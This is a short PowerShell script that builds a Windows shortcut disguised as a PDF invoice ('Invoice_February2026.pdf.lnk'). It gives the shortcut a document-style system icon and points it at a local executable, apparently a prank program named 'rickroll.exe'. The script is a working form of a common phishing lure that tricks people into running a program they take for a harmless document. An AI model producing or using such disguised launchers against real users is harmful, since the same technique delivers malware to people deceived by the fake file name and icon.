$shell = New-Object -ComObject WScript.Shell
$lnk = $shell.CreateShortcut("$PWD\Invoice_February2026.pdf.lnk")
$lnk.TargetPath = "C:\Users\ASUS ZEPHYRUS G15\Music\workspace\rickroll.exe"
$lnk.IconLocation = "C:\Windows\System32\imageres.dll,102"
$lnk.Save()
